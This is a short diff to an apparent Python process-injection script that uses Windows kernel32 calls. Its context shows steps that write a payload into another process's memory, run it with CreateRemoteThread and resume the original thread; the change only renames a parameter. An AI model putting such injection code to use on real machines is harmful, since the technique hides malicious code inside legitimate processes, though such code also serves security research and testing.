@@ -108,9 +108,9 @@ def write_payload(hProcess, lpBaseAddress, lpBuffer):
         raise ctypes.WinError(ctypes.get_last_error())
 
 
-def create_remote_thread(hProcess, lpBaseAddress):
+def create_remote_thread(hProcess, lpStartAddress):
     lpThreadId = wintypes.DWORD()
-    if not kernel32.CreateRemoteThread(hProcess, None, 0, lpBaseAddress, None, 0, ctypes.byref(lpThreadId)):
+    if not kernel32.CreateRemoteThread(hProcess, None, 0, lpStartAddress, None, 0, ctypes.byref(lpThreadId)):
         raise ctypes.WinError(ctypes.get_last_error())
         
 
@@ -128,7 +128,7 @@ lpBaseAddress = virtual_alloc_ex(hProcess, len(payload))
 write_payload(hProcess, lpBaseAddress, payload)
 
 # Step 4: create/execute new thread
-create_remote_thread(hProcess, lpBaseAddress)
+create_remote_thread(hProcess, lpStartAddress=lpBaseAddress)
 
 # Step 5: resume original thread/process execution
 kernel32.ResumeThread(hThread)
